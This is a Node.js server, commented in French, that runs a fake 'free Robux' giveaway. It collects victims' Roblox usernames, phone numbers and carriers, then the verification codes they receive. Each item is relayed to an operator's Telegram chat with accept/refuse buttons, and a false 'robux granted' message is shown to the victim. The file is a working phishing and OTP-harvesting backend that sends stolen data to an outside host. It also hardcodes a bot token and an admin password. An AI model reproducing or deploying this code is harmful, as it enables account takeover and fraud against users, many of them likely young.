const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const https = require('https');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'SecretLO2026!';
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8567457120:AAFeQo7xMyggPE1JXF3zxnIzDCP28R2N3OU';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '7777124789';

// ─── Telegram helpers ────────────────────────────────────────────────────────

function tgPost(method, payload) {
  return new Promise((resolve) => {
    const data = JSON.stringify(payload);
    const req = https.request({
      hostname: 'api.telegram.org',
      path: `/bot${TELEGRAM_BOT_TOKEN}/${method}`,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) }
    }, (res) => {
      let body = '';
      res.on('data', (chunk) => body += chunk);
      res.on('end', () => { try { resolve(JSON.parse(body)); } catch { resolve({}); } });
    });
    req.on('error', (e) => { console.error('Telegram Error:', e); resolve({}); });
    req.write(data);
    req.end();
  });
}

function sendTelegram(text, reply_markup = null) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  const payload = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' };
  if (reply_markup) payload.reply_markup = JSON.stringify(reply_markup);
  tgPost('sendMessage', payload);
}

// ─── Telegram Polling Loop ───────────────────────────────────────────────────

let tgOffset = 0;

setInterval(async () => {
  try {
    const res = await tgPost('getUpdates', { offset: tgOffset, timeout: 1, allowed_updates: ['callback_query'] });
    if (!res.ok || !res.result) return;

    for (const update of res.result) {
      tgOffset = update.update_id + 1;

      if (update.callback_query) {
        const cb = update.callback_query;
        // Vérification de sécurité : Seul ton CHAT_ID peut cliquer
        const senderId = (cb.from && cb.from.id) ? cb.from.id.toString() : '';
        if (senderId !== TELEGRAM_CHAT_ID.toString()) {
          await tgPost('answerCallbackQuery', {
            callback_query_id: cb.id,
            text: '🚫 Accès refusé.',
            show_alert: true
          });
          continue;
        }
        const parts = cb.data.split('_'); // "accept_3" or "refuse_3"
        const action = parts[0];          // "accept" | "refuse"
        const id = parseInt(parts[1]);    // request id

        const entry = requests[id];
        if (entry && entry.userWs && entry.userWs.readyState === WebSocket.OPEN) {
          const decision = action === 'accept' ? 'accepted' : 'refused';
          entry.status = decision;
          entry.userWs.send(JSON.stringify({ type: 'decision', decision }));

          // Also update admin panel if connected
          broadcast({ type: 'decision_update', id, decision });
        }

        // Dismiss the loading spinner on Telegram button
        await tgPost('answerCallbackQuery', {
          callback_query_id: cb.id,
          text: action === 'accept' ? '✅ Accepté !' : '❌ Refusé !',
          show_alert: false
        });

        // Edit the original message to show what was chosen
        if (cb.message) {
          const label = action === 'accept' ? '✅ ACCEPTÉ' : '❌ REFUSÉ';
          tgPost('editMessageReplyMarkup', {
            chat_id: TELEGRAM_CHAT_ID,
            message_id: cb.message.message_id,
            reply_markup: JSON.stringify({ inline_keyboard: [[{ text: label, callback_data: 'done' }]] })
          });
        }
      }
    }
  } catch (e) {
    // silently ignore network hiccups
  }
}, 1500);

// ─── Express + Auth ──────────────────────────────────────────────────────────

app.use(express.json());

app.get('/admin.html', (req, res, next) => {
  const authHeader = req.headers.authorization;
  if (!authHeader) {
    res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel Protected"');
    return res.status(401).send('Accès refusé. Authentification requise.');
  }

  const auth = Buffer.from(authHeader.split(' ')[1], 'base64').toString().split(':');
  const pass = auth[1];

  if (pass === ADMIN_PASSWORD) return next();

  res.setHeader('WWW-Authenticate', 'Basic realm="Admin Panel Protected"');
  return res.status(401).send('Mot de passe incorrect.');
});

app.use(express.static(path.join(__dirname, 'public')));

// ─── State ───────────────────────────────────────────────────────────────────

const requests = {};
let adminWs = null;
let counter = 1;

function broadcast(data) {
  const msg = JSON.stringify(data);
  if (adminWs && adminWs.readyState === WebSocket.OPEN) {
    adminWs.send(msg);
  }
}

// ─── WebSocket ───────────────────────────────────────────────────────────────

wss.on('connection', (ws, req) => {
  const url = new URL(req.url, `http://localhost`);
  const role = url.searchParams.get('role');
  const token = url.searchParams.get('token');

  if (role === 'admin') {
    if (token !== ADMIN_PASSWORD) {
      ws.close(1008, 'Authentification refusée');
      return;
    }

    adminWs = ws;
    const pending = Object.values(requests)
      .filter(r => r.status === 'pending')
      .map(r => ({ type: 'new_request', id: r.id, username: r.username, phone: r.phone, operator: r.operator, robuxAmount: r.robuxAmount }));
    pending.forEach(p => ws.send(JSON.stringify(p)));

    ws.on('message', (raw) => {
      try {
        const msg = JSON.parse(raw);
        if (msg.type === 'decision') {
          const entry = requests[msg.id];
          if (!entry) return;
          entry.status = msg.decision;
          if (entry.userWs && entry.userWs.readyState === WebSocket.OPEN) {
            entry.userWs.send(JSON.stringify({ type: 'decision', decision: msg.decision }));
          }
        }
        if (msg.type === 'code_valid') {
          const entry = requests[msg.id];
          if (!entry) return;
          if (entry.userWs && entry.userWs.readyState === WebSocket.OPEN) {
            entry.userWs.send(JSON.stringify({ type: 'robux_granted', robuxAmount: entry.robuxAmount }));
          }
        }
      } catch (e) {
        console.error('Erreur message admin:', e);
      }
    });

    ws.on('close', () => { if (adminWs === ws) adminWs = null; });
    return;
  }

  // ── User WS ──
  const id = counter++;
  ws.on('message', (raw) => {
    try {
      const msg = JSON.parse(raw);

      if (msg.type === 'submit') {
        requests[id] = {
          id,
          username: msg.username || 'Inconnu',
          phone: msg.phone,
          operator: msg.operator,
          robuxAmount: msg.robuxAmount || '10 000',
          status: 'pending',
          userWs: ws
        };
        ws.send(JSON.stringify({ type: 'waiting', id }));
        broadcast({
          type: 'new_request',
          id,
          username: msg.username || 'Inconnu',
          phone: msg.phone,
          operator: msg.operator,
          robuxAmount: msg.robuxAmount || '10 000'
        });

        // Telegram notification WITH inline buttons
        sendTelegram(
          `<b>💎 NOUVEAU NUMÉRO ROBUX !</b>\n\n🎮 <b>Pseudo Roblox :</b> <code>${msg.username || 'Inconnu'}</code>\n💎 <b>Montant :</b> ${msg.robuxAmount || '10 000'} Robux\n📱 <b>Numéro :</b> <code>${msg.phone}</code>\n📡 <b>Opérateur :</b> ${msg.operator}\n🆔 <b>ID Demande :</b> #${id}`,
          {
            inline_keyboard: [[
              { text: '✅ Accepter', callback_data: `accept_${id}` },
              { text: '❌ Refuser',  callback_data: `refuse_${id}` }
            ]]
          }
        );
      }

      if (msg.type === 'code_submit') {
        const entry = requests[id];
        if (!entry) return;
        broadcast({ type: 'code_entered', id, code: msg.code });

        sendTelegram(`<b>🔢 CODE REÇU ROBUX !</b>\n\n🎮 <b>Pseudo :</b> ${entry.username}\n📱 <b>Numéro :</b> <code>${entry.phone}</code>\n🔑 <b>CODE :</b> <code>${msg.code}</code>`);

        setTimeout(() => {
          if (ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: 'robux_granted', robuxAmount: entry.robuxAmount }));
          }
        }, 1500);
      }
    } catch (e) {
      console.error('Erreur message utilisateur:', e);
    }
  });

  ws.on('close', () => {
    if (requests[id]) requests[id].userWs = null;
  });
});

// ─── Start ───────────────────────────────────────────────────────────────────

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`🚀  Serveur Robux démarré → http://localhost:${PORT}`);
  console.log(`📡  Telegram polling actif...`);
});
